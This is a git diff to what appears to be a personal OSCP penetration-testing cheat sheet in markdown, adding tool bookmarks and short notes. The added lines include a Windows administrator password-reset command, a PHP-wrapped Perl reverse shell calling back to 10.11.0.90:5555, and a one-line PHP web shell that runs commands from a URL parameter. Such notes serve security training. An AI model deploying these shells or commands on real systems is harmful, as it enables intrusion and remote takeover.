@@ -23,6 +23,11 @@ win="rdesktop -u username -p password 1.2.3.4"
 source .bashrc
 ```
 
+Reset Windows user password
+```
+net user administrator newpassword
+```
+
 ### Kali
 Search exploits
 ```
@@ -44,11 +49,15 @@ msfvenom *replaced msfpayload in older articles*
 
 [Msfvenom Cheat Sheet](https://thor-sec.com/cheatsheet/oscp/msfvenom_cheat_sheet/)
 
+gobuster
+[Gobuster Package Description](https://tools.kali.org/web-applications/gobuster)
+
 ## Useful Bookmarks
 Detailed explanation on how tools/exploits work.
 
 ### Windows
 [Windows Privilege Escalation Fundamentals](http://www.fuzzysecurity.com/tutorials/16.html)
+[AutoBlue](https://0xdf.gitlab.io/2019/02/22/wl-dummy.html)
 
 ### MySQL
 [GAINING A ROOT SHELL USING MYSQL USER DEFINED FUNCTIONS AND SETUID BINARIES](https://infamoussyn.wordpress.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/)
@@ -60,9 +69,13 @@ Detailed explanation on how tools/exploits work.
 [Deep Dive Into Stageless Meterpreter Payloads](https://blog.rapid7.com/2015/03/25/stageless-meterpreter-payloads/)
 [Offensive Msfvenom: From Generating Shellcode to Creating Trojans] (https://medium.com/@PenTest_duck/offensive-msfvenom-from-generating-shellcode-to-creating-trojans-4be10179bb86)
 
-### Shell Code
-[0x7 Exploit Tutorial: Bad Character Analysis](http://www.primalsecurity.net/0x7-exploit-tutorial-bad-character-analysis/)
+### Java
+[Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet)
+[Java RMI](https://github.com/JoyChou93/java-sec-code/wiki/Java-RMI)
 
+### Shell Code
+
+[0x7 Exploit Tutorial: Bad Character Analysis](http://www.primalsecurity.net/0x7-exploit-tutorial-bad-character-analysis/)
 ```python
 bad_chars = ""
 bad_chars += "x01x02x03x04x05x06x07x08x09x0ax0bx0cx0dx0ex0fx10"
@@ -82,3 +95,24 @@ bad_chars += "xd1xd2xd3xd4xd5xd6xd7xd8xd9xdaxdbxdcxddxdexdfxe0"
 bad_chars += "xe1xe2xe3xe4xe5xe6xe7xe8xe9xeaxebxecxedxeexefxf0"
 bad_chars += "xf1xf2xf3xf4xf5xf6xf7xf8xf9xfaxfbxfcxfdxfexff"
 ```
+
+### Reverse Shell
+PHP calls perl for reverse shell (quotes must be escaped properly - test it locally first!)
+```php
+<?php
+$cmd = "perl -e 'use Socket;\$i=\"10.11.0.90\";\$p=5555;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'";
+shell_exec($cmd);
+?>
+```
+
+### Web Shell
+PHP
+```php
+<?php echo shell_exec($_GET["cmd"]); ?>
+```
+
+
+### Exam
+[A Script Kiddie’s guide to Passing OSCP on your first attempt](https://forum.hackthebox.eu/discussion/1730/a-script-kiddie-s-guide-to-passing-oscp-on-your-first-attempt)
+
+[Pentest Book](https://chryzsh.gitbooks.io/pentestbook/content/list_of_common_ports.html)
